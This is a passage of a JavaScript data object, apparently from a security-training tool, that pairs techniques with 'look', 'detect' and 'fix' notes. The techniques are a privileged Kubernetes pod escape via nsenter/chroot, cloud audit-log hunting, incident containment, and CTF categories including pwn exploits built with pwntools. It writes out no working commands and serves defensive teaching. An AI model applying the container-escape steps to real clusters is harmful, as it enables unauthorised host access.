    'Escape a privileged pod': {level: 'advanced', look: 'The node filesystem and processes reachable from inside the container (chroot/nsenter working).', detect: 'Pods created with privileged/hostPath/hostPID and runtime nsenter/chroot on nodes.', fix: 'Enforce the restricted Pod Security Standard and deny privileged/hostPath via admission.'},
    'Pull the logs': {level: 'basic', look: 'The per-provider audit trail, exported for timeline and hunting work.', detect: 'This is the collection step; ensure trails/logs are enabled in all regions and accounts.', fix: 'Centralise logs in a locked account, enable everywhere, and validate integrity.'},
    'Key events to hunt': {level: 'intermediate', look: 'The listed high-signal API calls \u2014 new credentials, policy changes, logging disabled, secret reads.', detect: 'These exact event names across AWS/Azure/GCP; correlate with new IPs and principals.', fix: 'Alert on each event, enforce MFA and least privilege, and auto-respond where possible.'},
    'Contain & rotate': {level: 'intermediate', look: 'Disabled keys/users and revoked sessions \u2014 the result of containment actions.', detect: 'UpdateAccessKey, user-disable and session-revoke events are your own IR actions to record.', fix: 'This is the remediation; follow with full credential rotation and persistence review.'},
    'Crypto': {level: 'basic', look: 'The scheme identified, then the plaintext/key recovered with the matching tool.', detect: 'Not applicable \u2014 offline CTF category.', fix: 'Not applicable \u2014 CTF practice; in production, use vetted algorithms and strong keys.'},
    'Forensics': {level: 'basic', look: 'File types, embedded/appended data, packet contents and memory artifacts leading to the flag.', detect: 'Not applicable \u2014 offline CTF category.', fix: 'Not applicable \u2014 CTF practice.'},
    'Steganography': {level: 'basic', look: 'Hidden data in LSB/bit planes, an audio spectrogram, or an embedded file behind a passphrase.', detect: 'Not applicable \u2014 offline CTF category.', fix: 'Not applicable \u2014 CTF practice.'},
    'Reversing & pwn': {level: 'intermediate', look: 'The bug class and the offset, then a working exploit built with pwntools.', detect: 'Not applicable \u2014 offline CTF category.', fix: 'Not applicable \u2014 CTF practice; in production, enable mitigations (ASLR, NX, canaries, PIE).'}
  }
};
